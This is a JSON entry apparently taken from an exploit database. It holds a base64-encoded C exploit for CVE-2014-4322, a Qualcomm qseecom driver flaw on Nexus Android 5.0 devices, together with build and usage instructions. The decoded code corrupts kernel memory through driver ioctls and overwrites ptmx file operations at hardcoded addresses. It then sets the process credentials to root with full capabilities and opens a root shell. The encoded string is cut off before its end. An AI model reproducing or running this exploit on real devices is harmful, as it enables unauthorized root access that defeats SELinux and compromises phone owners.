{
    "source": "exploit-database", 
    "exploit": "LyoNCiAqICAgICAgICAgICAgICBDVkUtMjAxNC00MzIyIGV4cGxvaXQgIGZvciBOZXh1cyBBbmRyb2lkIDUuMA0KICoNCiAqICAgICAgICAgICAgICBhdXRob3I6ICByZXRtZSAgIHJldG1lN0BnbWFpbC5jb20NCiAqICAgICAgICAgICAgICB3ZWJzaXRlOiByZXRtZS5uZXQNCiAqDQogKgkJCQkgVGhlIGV4cGxvaXQgbXVzdCBiZSBleGN1dGVkIGFzIHN5c3RlbSBwcml2aWxlZ2UgYW5kIHNwZWNpZmljICBTRUxpbnV4ICBjb250ZXh0Lg0KICoJCQkJIElmIGV4cGxvaXQgc3VjY2Vzc2VkLHlvdSB3aWxsIGdhaW4gcm9vdCBwcml2aWxlZ2UgYW5kICJrZXJuZWwiIFNFTGludXggIGNvbnRleHQNCiAqDQogKiAgICAgICAgICAgICAgYnVnIGluZm86DQogKiAgICAgICAgICAgICAgCWh0dHBzOi8vd3d3LmNvZGVhdXJvcmEub3JnL3Byb2plY3RzL3NlY3VyaXR5LWFkdmlzb3JpZXMvbWVtb3J5LWNvcnJ1cHRpb24tcXNlZWNvbS1kcml2ZXItY3ZlLTIwMTQtNDMyMg0KICoNCiAqCQkJCSBob3cgdG8gYnVpbGQ6DQogKg0KCQkJIAkJCQkgICAgY3JlYXRlIGFuICBBbmRyb2lkLm1rIGFzIGZvbGxvdzoNCg0KCQkJCQkJCQkJaW5jbHVkZSAkKENMRUFSX1ZBUlMpDQoJCQkJCQkJCQlpbmNsdWRlICQoQ0xFQVJfVkFSUykNCgkJCQkJCQkJCUxPQ0FMX1NSQ19GSUxFUzo9IC4vbXNtLmMgXA0KCQkJCQkJCQkJCQkJCQkJCQkJCQkgLi9zaGVsbGNvZGUuUw0KDQoJCQkJCQkJCQlMT0NBTF9NT0RVTEU6PSBleHBsb2l0DQoJCQkJCQkJCQkjTE9DQUxfQ19JTkNMVURFUyArPSAkKGNvbW1vbl9pbmNsdWRlcykNCgkJCQkJCQkJCUxPQ0FMX0NQUEZMQUdTICs9IC1EREVCVUcNCgkJCQkJCQkJCUxPQ0FMX0NGTEFHUyArPSAtRERFQlVHDQoJCQkJCQkJCQlMT0NBTF9MRExJQlMgKz0gLUwkKFNZU1JPT1QpL3Vzci9saWIgLWxsb2cNCg0KCQkJCQkJCQkJaW5jbHVkZSAkKEJVSUxEX0VYRUNVVEFCTEUpDQoJCQkJCQkJCQlpbmNsdWRlICQoQlVJTERfRVhFQ1VUQUJMRSkNCg0KCQkJCQkJCQljcmVhdGUgQXBwbGljYXRpb24ubWsgYXMgZm9sbG93Og0KDQoJCQkJCQkJCQlBUFBfQUJJIDo9IGFybWVhYmkNCgkJCQkJCQkJCUFQUF9QTEFURk9STSA6PSBhbmRyb2lkLTgNCgkJCQkJCQkJCUFQUF9QSUU6PSB0cnVlDQoNCgkJCQkJCQkJdXNlICBuZGstYnVpbGQgdG8gYnVpbGQgdGhlIHByb2plY3QNCg0KCQkJCXVzYWdlOg0KDQoJCQkJCQkJIHJ1biAgZXhwbG9pdCBhcyAgc3lzdGVtIHByaXZpbGVnZSx3aXRoIFNFTGludXggY29udGV4dCAgc3VjaCBhcyAia2V5c3RvcmUiLCJ2b2xkIiwiZHJtc2VydmVyIiwibWVkaWFzZXJ2ZXIiLCJzdXJmYWNlZmxpbmdlciINCiAqDQogKgkJCQkJCQkgSWYgZXhwbG9pdCBzdWNjZXNzZWQseW91IHdpbGwgZ2FpbiByb290IHByaXZpbGVnZSBhbmQgImtlcm5lbCIgU0VMaW51eCAgY29udGV4dA0KICoNCiAqDQogKiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAqLw0KLy89PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PW1zbS5jPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8am5pLmg+DQojaW5jbHVkZSA8YW5kcm9pZC9sb2cuaD4NCiNpbmNsdWRlIDxwdGhyZWFkLmg+DQojaW5jbHVkZSA8c3lzL3ByY3RsLmg+DQojaW5jbHVkZSA8c3lzL2lvY3RsLmg+DQojaW5jbHVkZSA8c3RkaW8uaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCiNpbmNsdWRlIDxhc20vcHRyYWNlLmg+DQojaW5jbHVkZSA8YXNtL3VzZXIuaD4NCiNpbmNsdWRlIDxhc20vcHRyYWNlLmg+DQojaW5jbHVkZSA8c3lzL3dhaXQuaD4NCiNpbmNsdWRlIDxzeXMvbW1hbi5oPg0KI2luY2x1ZGUgPHN5cy90eXBlcy5oPg0KI2luY2x1ZGUgPGRsZmNuLmg+DQojaW5jbHVkZSA8ZGlyZW50Lmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8bGludXgvZWxmLmg+DQojaW5jbHVkZSA8bGludXgvcmVib290Lmg+DQojaW5jbHVkZSA8ZXJybm8uaD4NCiNpbmNsdWRlIDxkbGZjbi5oPg0KI2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RkbGliLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8ZmNudGwuaD4NCiNpbmNsdWRlIDx1bmlzdGQuaD4NCiNpbmNsdWRlIDxlcnJuby5oPg0KI2luY2x1ZGUgPGRpcmVudC5oPg0KI2luY2x1ZGUgPHN5cy90eXBlcy5oPg0KI2luY2x1ZGUgPHN5cy9zdGF0Lmg+DQojaW5jbHVkZSA8c3lzL21vdW50Lmg+DQojaW5jbHVkZSA8bGludXgvcHRyYWNlLmg+DQojaW5jbHVkZSA8bGludXgvcHJjdGwuaD4NCiNpbmNsdWRlIDxzeXMvc3lzdGVtX3Byb3BlcnRpZXMuaD4NCiNpbmNsdWRlIDxlcnJuby5oPg0KI2luY2x1ZGUgPHRlcm1pb3MuaD4NCiNpbmNsdWRlIDxzeXMvc3lzY2FsbC5oPg0KI2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4NCiNpbmNsdWRlIDxhcnBhL2luZXQuaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCiNpbmNsdWRlIDxzdHJpbmcuaD4NCiNpbmNsdWRlIDx1bmlzdGQuaD4NCiNpbmNsdWRlIDxuZXRpbmV0L2luLmg+DQojaW5jbHVkZSA8ZXJybm8uaD4NCiNpbmNsdWRlIDxsaW51eC9pb24uaD4NCg0KI2luY2x1ZGUgIi4uL2tlcm5lbC5oIg0KI2luY2x1ZGUgInFzZWVjb20uaCINCg0KLy80LjQuMiAgIENGVyhmb3IgZGVidWcpDQovLyNkZWZpbmUgUFRNWF9GT1BTIDB4YzEzMzRlMDANCi8vZm5QcmludGsgcHJpbnRrID0gMHhjMGEwMTEzYzsNCg0KLy9OZXh1cyBBbmRyb2lkIDUuMCAgT0ZXDQojZGVmaW5lIFBUTVhfREVWSUNFICIvZGV2L3B0bXgiDQojZGVmaW5lIFBUTVhfRk9QUyAweGMxMjM2Y2Q4DQpmblByaW50ayBwcmludGsgPSAweGMwYTIxZTc4Ow0KDQppbnQgTXlDb21taXRDcmVkKGludCBydWlkLCBpbnQgcmdpZCwgc2lnbmVkIGludCBhMywgaW50IGlzU2VsaW51eCk7DQoNCmludCAga21lbWNtcChjaGFyICphMSwgY2hhciAqYTIsIGludCBsZW4pDQp7DQogIGludCB2MzsgLy8gcjNAMg0KICBpbnQgdjQ7IC8vIHI0QDMNCiAgaW50IHY1OyAvLyByNUAzDQogIGludCByZXN1bHQ7IC8vIHIwQDQNCg0KICBpZiAoIGxlbiApDQogIHsNCiAgICB2MyA9IDA7DQogICAgd2hpbGUgKCAxICkNCiAgICB7DQogICAgICB2NCA9IGExW3YzXTsNCiAgICAgIHY1ID0gYTJbdjNdOw0KICAgICAgaWYgKCB2NCAhPSB2NSApDQogICAgICAgIGJyZWFrOw0KICAgICAgaWYgKCBhMVt2M10gKQ0KICAgICAgew0KICAgICAgICArK3YzOw0KICAgICAgICBpZiAoIGxlbiAhPSB2MyApDQogICAgICAgICAgY29udGludWU7DQogICAgICB9DQogICAgICBnb3RvIExBQkVMXzc7DQogICAgfQ0KICAgIHJlc3VsdCA9IHY0IC0gdjU7DQogIH0NCiAgZWxzZQ0KICB7DQpMQUJFTF83Og0KICAgIHJlc3VsdCA9IDA7DQogIH0NCiAgcmV0dXJuIHJlc3VsdDsNCn0NCg0KaW50IGdfcGlkID0gMDsNCmludCBnX3RnaWQgPSAwOw0KDQoNCg0KaW50IG9wZW5faW9uKCl7DQoJaW50IGZkID0gb3BlbigiL2Rldi9pb24iLE9fUkRPTkxZKTsNCiAgICBpZiAoZmQ8MCl7DQogICAgCXBlcnJvcigib3BlbiIpOw0KICAgIH0NCiAgICBwcmludGYoImlvbiBmZCAgJWRcbiIsZmQpOw0KICAgIHJldHVybiBmZDsNCn0NCg0KDQovLyBodHRwOi8vbHduLm5ldC9BcnRpY2xlcy80ODAwNTUvDQoNCi8qDQogKiBzdHJ1Y3QgaW9uX2FsbG9jYXRpb25fZGF0YSB7DQoJc2l6ZV90IGxlbjsNCglzaXplX3QgYWxpZ247DQoJdW5zaWduZWQgaW50IGhlYXBfbWFzazsNCgl1bnNpZ25lZCBpbnQgZmxhZ3M7DQoJc3RydWN0IGlvbl9oYW5kbGUgKmhhbmRsZTsNCn07DQogKg0KICoNCiAqICovDQojZGVmaW5lIElPTl9GTEFHX1NFQ1VSRSAoMTw8MzEpDQoNCmludCBhbGxvY19pb25fbWVtb3J5KGludCBjbGllbnRfZmQsaW50IHNpemUsc3RydWN0IGlvbl9oYW5kbGUqKiBwcGhhbmRsZSl7DQoJaW50IHJldCA9IC0xOw0KDQoJc3RydWN0IGlvbl9hbGxvY2F0aW9uX2RhdGEgZGF0YTsNCg0KLy8gSU9OX0ZMQUdfQ0FDSEVEDQoJZGF0YS5sZW4gPSBzaXplOw0KCWRhdGEuYWxpZ24gPSBzaXplOw0KCWRhdGEuZmxhZ3MgPSBJT05fSEVBUF9UWVBFX0NBUlZFT1VUIDsNCgkvL2RhdGEuaGVhcF9tYXNrID0gSU9OX0hFQVBfVFlQRV9DQVJWRU9VVDsNCgkvL2RhdGEuaGFuZGxlID0gaGFuZGxlOw0KDQoJcmV0ID0gaW9jdGwoY2xpZW50X2ZkLCBJT05fSU9DX0FMTE9DLCAmZGF0YSk7DQoJaWYgKHJldDwwKXsNCgkJcGVycm9yKCJJT05fSU9DX0FMTE9DIik7DQoJfQ0KCSpwcGhhbmRsZSA9IGRhdGEuaGFuZGxlOw0KCXJldHVybiByZXQ7DQoNCn0NCi8qDQogICAgc3RydWN0IGlvbl9mZF9kYXRhIHsNCiAgICAgICAgc3RydWN0IGlvbl9oYW5kbGUgKmhhbmRsZTsNCiAgICAgICAgaW50IGZkOw0KICAgfQ0KICAgKi8NCmludCBzaGFyZV9pb25fbWVtb3J5KGludCBjbGllbnRfZmQsc3RydWN0IGlvbl9oYW5kbGUqIGhhbmRsZSl7DQoJc3RydWN0IGlvbl9mZF9kYXRhIGRhdGE7DQoJZGF0YS5oYW5kbGUgPSBoYW5kbGU7DQoJZGF0YS5mZCA9IC0xOw0KDQoJaW50IHJldCA9IGlvY3RsKGNsaWVudF9mZCwgSU9OX0lPQ19TSEFSRSwgJmRhdGEpOw0KDQoNCglyZXR1cm4gZGF0YS5mZDsNCg0KfQ0KDQoNCg0KDQppbnQgb2J0YWluX2RtYV9idWZfZmQoaW50IHNpemUpew0KCQlpbnQgZmRfZGV2aWNlID0gb3Blbl9pb24oKTsNCgkJaW50IGRtZl9mZCA9IC0xOw0KDQoJCXN0cnVjdCBpb25faGFuZGxlKiBoYW5kbGU7DQoJCWludCByZXQgPSBhbGxvY19pb25fbWVtb3J5KGZkX2RldmljZSxzaXplLCZoYW5kbGUpOw0KCQlpZiAocmV0PDApew0KCQkJcGVycm9yKCJhbGxvY19pb25fbWVtb3J5Iik7DQoJCX0NCg0KCQlkbWZfZmQgPSBzaGFyZV9pb25fbWVtb3J5KGZkX2RldmljZSxoYW5kbGUpOw0KDQoJCWlmIChkbWZfZmQ8MCl7DQoJCQlwZXJyb3IoInNoYXJlX2lvbl9tZW1vcnkiKTsNCgkJfQ0KCQlyZXR1cm4gZG1mX2ZkOw0KfQ0KDQoNCnZvaWQqIGZkX3RvX21tYXAoaW50IGZkLGludCBzaXplKXsNCg0KDQogICAgdm9pZCogc2VnX2FkZHIgPSBtbWFwKDAsDQogICAgCQkJCQlzaXplCSwNCiAgICAJCQkJCVBST1RfUkVBRCB8IFBST1RfV1JJVEUsDQogICAgCQkJCQlNQVBfU0hBUkVELA0KICAgICAgICAgICAgICAgICAgICAgICAgICBmZCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgMCk7DQoNCiAgICBpZihzZWdfYWRkciA9PSBNQVBfRkFJTEVEKXsNCiAgICAJcGVycm9yKCJmZF90b19tYXAiKTsNCiAgICB9DQoNCglyZXR1cm4gc2VnX2FkZHI7DQp9DQoNCg0KDQovL2MwYTAxMTNjIFQgcHJpbnRrDQp2b2lkIHNheWhlbGxvKCl7DQoJZm5QcmludGsgcHJpbnRrID0gMHhjMGEwMTEzYzsNCglwcmludGsoImhlbGwwIHNoZWxsb2NkZSIpOw0KCXJldHVybjsNCn0NCg0Kdm9pZCBzaGVsbF9jb2RlMigpOw0KDQpzdGF0aWMgaW50DQpydW5fb2J0YWluX3Jvb3RfcHJpdmlsZWdlKCkNCnsNCiAgaW50IGZkOw0KICBpbnQgcmV0Ow0KDQogIGZkID0gb3BlbihQVE1YX0RFVklDRSwgT19XUk9OTFkpOw0KICBpZihmZDw9MCl7cGVycm9yKCJwdG14Iik7cmV0dXJuIC0xO30NCiAgcmV0ID0gZnN5bmMoZmQpOw0KICBjbG9zZShmZCk7DQoNCiAgcmV0dXJuIHJldDsNCn0NCg0KDQppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqYXJndltdKXsNCg0KICAgICAgICBwcmludGYoIm15cGlkICVkXG4iLGdldHBpZCgpKTsNCiAgICAgICAgaW50IHJldCAgPSAtMTsNCg0KICAgICAgICAgICAgICAgICAgICAgICAgaW50ICBmZCA9IG9wZW4oIi9kZXYvcXNlZWNvbSIsIDApOw0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGZkPDApew0KICAgICAgICAgICAgICAgICAgICAgICAgCXBlcnJvcigib3BlbiIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgCWV4aXQoLTEpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgICAgICB2b2lkKiBhYnVzZUJ1ZmYgPSBtYWxsb2MoNDAwKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIG1lbXNldChhYnVzZUJ1ZmYsMCw0MDApOw0KDQogICAgICAgICAgICAgICAgICAgICAgICBpbnQqIGludEFyciA9IChpbnQqKWFidXNlQnVmZjsNCiAgICAgICAgICAgICAgICAgICAgICAgIGludCBqID0gMDsNCg0KICAgICAgICAgICAgICAgICAgICAgICAgZm9yKGo9MDtqPDI0O2orKyl7DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbnRBcnJbal0gPSAweDE7DQoNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCg0KDQogICAgICAgICAgICAgICAgICAgICAgICBzdHJ1Y3QgcXNlZWNvbV9zZW5kX21vZGZkX2NtZF9yZXEgaW9jdGxCdWZmOw0KDQogICAgICAgICAgICAgICAgICAgICAgICBwcmN0bChQUl9TRVRfTkFNRSwgIkdvZEZhdGhlciIsIDAsIDAsIDApOw0KDQogICAgICAgICAgICAgICAgICAgICAgIC8vIGlmKDA9PWZvcmsoKSl7DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBnX3BpZCA9IGdldHBpZCgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdfdGdpZCA9IGdfcGlkOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByY3RsKFBSX1NFVF9OQU1FLCAiaWhvby5kYXJreXRvb2xzIiwgMCwgMCwgMCk7DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAvL1FTRUVDT01fSU9DVExfU0VUX01FTV9QQVJBTV9SRVENCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJ1Y3QgcXNlZWNvbV9zZXRfc2JfbWVtX3BhcmFtX3JlcSByZXE7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVxLmlmZF9kYXRhX2ZkID0gb2J0YWluX2RtYV9idWZfZmQoODE5Mik7DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXEudmlydF9zYl9iYXNlID0gYWJ1c2VCdWZmOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcS5zYl9sZW4gPSA4MTkyOw0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0ID0gaW9jdGwoZmQsIFFTRUVDT01fSU9DVExfU0VUX01FTV9QQVJBTV9SRVEsICZyZXEpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ZigiUVNFRUNPTV9JT0NUTF9TRVRfTUVNX1BBUkFNX1JFUSByZXR1cm4gMHgleCBcbiIscmV0KTsNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlvY3RsQnVmZi5jbWRfcmVxX2J1ZiA9IGFidXNlQnVmZjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpb2N0bEJ1ZmYuY21kX3JlcV9sZW4gPSA0MDA7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaW9jdGxCdWZmLnJlc3BfYnVmID0gYWJ1c2VCdWZmOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlvY3RsQnVmZi5yZXNwX2xlbiA9IDQwMDsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbnQgaSA9IDA7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIChpID0gMDtpPDQ7aSsrKXsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAJaW9jdGxCdWZmLmlmZF9kYXRhW2ldLmZkID0gMDsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAJaW9jdGxCdWZmLmlmZF9kYXRhW2ldLmNtZF9idWZfb2Zmc2V0ID0wOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpb2N0bEJ1ZmYuaWZkX2RhdGFbMF0uZmQgPSByZXEuaWZkX2RhdGFfZmQ7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaW9jdGxCdWZmLmlmZF9kYXRhWzBdLmNtZF9idWZfb2Zmc2V0ID0gICAwOy8vKGludCkoMHhjMDNmMGFiNCArIDgpIC0gKGludClhYnVzZUJ1ZmY7DQoNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludGYoIlFTRUVDT01fSU9DVExfU0VORF9DTURfUkVRIik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldCA9IGlvY3RsKGZkLCBRU0VFQ09NX0lPQ1RMX1NFTkRfTU9ERkRfQ01EX1JFUSwgJmlvY3RsQnVmZik7DQoNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludGYoInJldHVybiAlcCAlcFxuIixpbnRBcnJbMF0saW50QXJyWzFdKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGVycm9yKCJRU0VFQ09NX0lPQ1RMX1NFTkRfQ01EX1JFUSBlbmRcbiIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludGYoImlvY3RsIHJldHVybiAweCV4IFxuIixyZXQpOw0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vKihpbnQqKWludEFyclswXSA9IDB4MDsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdm9pZCogYWRkciA9IG1tYXAoaW50QXJyWzBdLDQwOTYsUFJPVF9SRUFEfFBST1RfV1JJVEV8UFJPVF9FWEVDLE1BUF9QUklWQVRFfE1BUF9GSVhFRHxNQVBfQU5PTllNT1VTLC0xLDApOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludGYoIm1tYXAgcmV0dXJuICVwIFxuIixhZGRyKTsNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAqKGludCopYWRkciA9ICAweEUzNTAwMDAwOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAqKChpbnQqKSgoaW50KWFkZHIrNCkpID0gMHhlMWEwZjAwZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbWVtY3B5KGFkZHIsc2hlbGxfY29kZTIsNDAwKTsNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbnQqIGFyciA9IChpbnQqKWFkZHI7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvcihpPTA7aTwxMDtpKyspew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAJaWYoYXJyW2ldID09IDB4ZWVlZWVlZWUpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAkJYXJyW2ldID0gKGludClNeUNvbW1pdENyZWQ7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAlwcmludGYoIiVwXG4iLGFycltpXSk7DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vYzEzMzRlMDAgYiBwdG14X2ZvcHMNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW9jdGxCdWZmLmlmZF9kYXRhWzBdLmNtZF9idWZfb2Zmc2V0ID0gICAoaW50KShQVE1YX0ZPUFMgKyAxNCo0KSAtIChpbnQpYWJ1c2VCdWZmOw0KDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnRmKCJRU0VFQ09NX0lPQ1RMX1NFTkRfQ01EX1JFUSIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXQgPSBpb2N0bChmZCwgUVNFRUNPTV9JT0NUTF9TRU5EX01PREZEX0NNRF9SRVEsICZpb2N0bEJ1ZmYpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludGYoInJldHVybiAlcCAlcFxuIixpbnRBcnJbMF0saW50QXJyWzFdKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGVycm9yKCJRU0VFQ09NX0lPQ1RMX1NFTkRfQ01EX1JFUSBlbmRcbiIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludGYoImlvY3RsIHJldHVybiAweCV4IFxuIixyZXQpOw0KDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcnVuX29idGFpbl9yb290X3ByaXZpbGVnZSgpOw0KDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hhciAqIGFyZ3YxW109eyJzaCIsKGNoYXIgKikwfTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbnQgcmVzdWx0ID0gIGV4ZWN2KCIvc3lzdGVtL2Jpbi9zaCIsIGFyZ3YxKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYocmVzdWx0KXsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBlcnJvcigiZXhlY3YiKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgIHJldHVybiAwOw0KDQoNCn0NCg0KDQoNCg0KDQppbnQgTXlDb21taXRDcmVkKGludCBydWlkLCBpbnQgcmdpZCwgc2lnbmVkIGludCBhMywgaW50IGlzU2VsaW51eCkNCnsNCg0KICAgICAgICBpbnQgdjM4OyAvLyBbc3ArMGhdIFticC02MGhdQDENCiAgICAgICAgaW50IGFkZHJCYXNlOw0KICAgICAgICBjaGFyIHN6TmFtZVsxNl0gPSAiaWhvby5kYXJreXRvb2xzIjsNCiAgICAgICAgaW50IG9mZnNldDsNCiAgICAgICAgbXljcmVkICpteV9jcmVkOw0KICAgICAgICBteWNyZWQgKm15X3JlYWxfY3JlZDsNCiAgICAgICAgc3RydWN0IHRhc2tfc2VjdXJpdHlfc3RydWN0ICogdHNlYzsNCiAgICAgICAgaW50IHJldCA9IC0xOw0KDQogICAgICAgIGludCBzZWFyY2hMZW50aDsNCg0KICAgICAgICBpc1NlbGludXggPSAxOw0KICAgICAgICAvL3JldHVybiAwOw0KICAgICAgICBhZGRyQmFzZSA9ICooaW50KikoKChpbnQpKCZ2MzgpICYgMHhGRkZGRTAwMCkgKyAweEMpOw0KICAgICAgICAvL3JldHVybiBhZGRyQmFzZTsNCiAgICAgICAgaWYgKCBhZGRyQmFzZSA+IDB4QkZGRkZGRkYgKQ0KICAgICAgICB7DQoNCiAgICAgICAgICBvZmZzZXQgPSAwOw0KICAgICAgICAgIHdoaWxlICggMSApDQogICAgICAgICAgew0KICAgICAgICAgICAgYWRkckJhc2UgKz0gNDsNCiAgICAgICAgICAgIGlmICggIWttZW1jbXAoYWRkckJhc2UsIHN6TmFtZSwgMTYpICkNCiAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICArK29mZnNldDsNCiAgICAgICAgICAgIGlmICggb2Zmc2V0ID09IDB4NjAwICkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgcmV0dXJuIDE4Ow0KICAgICAgICAgICAgfQ0KICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgcmV0dXJuIDE3Ow0KDQogICAgICAgIG15X2NyZWQgPSAqKGludCopKGFkZHJCYXNlIC04KTsNCiAgICAgICAgbXlfcmVhbF9jcmVkID0gKihpbnQqKShhZGRyQmFzZSAtOCAtIDQpOw0KDQoNCiAgICAgICAgc2VhcmNoTGVudGggPSAwOw0KICAgICAgICB3aGlsZShzZWFyY2hMZW50aDwweDIwKXsNCg0KDQogICAgICAgICAgICAgICAgICAgICAgICBpZighbXlfY3JlZCB8fCAhbXlfcmVhbF9jcmVkDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfHwgbXlfY3JlZDwweEJGRkZGRkZGIHx8IG15X3JlYWxfY3JlZDwweEJGRkZGRkZGDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICApew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vMi42Pw0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYWRkckJhc2UtPTQ7DQoNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG15X2NyZWQgPSAqKGludCopKGFkZHJCYXNlLTggKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBteV9yZWFsX2NyZWQgPSAqKGludCopKGFkZHJCYXNlIC04LTQpOw0KDQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KDQogICAgICAgICAgICAgICAgICAgICAgICBzZWFyY2hMZW50aCsrOw0KICAgICAgICB9DQoNCiAgICAgICAgaWYoc2VhcmNoTGVudGggPT0gMHgyMCkNCiAgICAgICAgICAgICAgICByZXR1cm4gMFgyMDsNCiAgICAgICAgICAgICAgICAvLyBmdWNrISEgd2hlcmUgaXMgbXkgY3JlZD8/Pw0KDQoNCiAgICAgICAgbXlfY3JlZC0+dWlkID0gMDsNCiAgICAgICAgbXlfY3JlZC0+Z2lkID0gMDsNCiAgICAgICAgbXlfY3JlZC0+c3VpZCA9IDA7DQogICAgICAgIG15X2NyZWQtPnNnaWQgPSAwOw0KICAgICAgICBteV9jcmVkLT5lZ2lkID0gMDsNCiAgICAgICAgbXlfY3JlZC0+ZXVpZCA9IDA7DQogICAgICAgIG15X2NyZWQtPmZzZ2lkID0gMDsNCiAgICAgICAgbXlfY3JlZC0+ZnN1aWQgPSAwOw0KICAgICAgICBteV9jcmVkLT5zZWN1cmViaXRzPTA7DQogICAgICAgIG15X2NyZWQtPmNhcF9ic2V0LmNhcFswXSA9IC0xOw0KICAgICAgICBteV9jcmVkLT5jYXBfYnNldC5jYXBbMV0gPSAtMTsNCiAgICAgICAgbXlfY3JlZC0+Y2FwX2luaGVyaXRhYmxlLmNhcFswXSA9IC0xOw0KICAgICAgICBteV9jcmVkLT5jYXBfaW5oZXJpdGFibGUuY2FwWzFdID0gLTE7DQogICAgICAgIG15X2NyZWQtPmNhcF9wZXJtaXR0ZWQuY2FwWzBdID0gLTE7DQogICAgICAgIG15X2NyZWQtPmNhcF9wZXJtaXR0ZWQuY2FwWzFdID0gLTE7DQogICAgICAgIG15X2NyZWQtPmNhcF9lZmZlY3RpdmUuY2FwWzBdID0gLTE7DQogICAgICAgIG15X2NyZWQtPmNhcF9lZmZlY3RpdmUuY2FwWzFdID0gLTE7DQoNCiAgICAgICAgbXlfcmVhbF9jcmVkLT51aWQgPSAwOw0KICAgICAgICBteV9yZWFsX2NyZWQtPmdpZCA9IDA7DQogICAgICAgIG15X3JlYWxfY3JlZC0+c3VpZCA9IDA7DQogICAgICAgIG15X3JlYWxfY3JlZC0+c2dpZCA9IDA7DQogICAgICAgIG15X3JlYWxfY3JlZC0+ZWdpZCA9IDA7D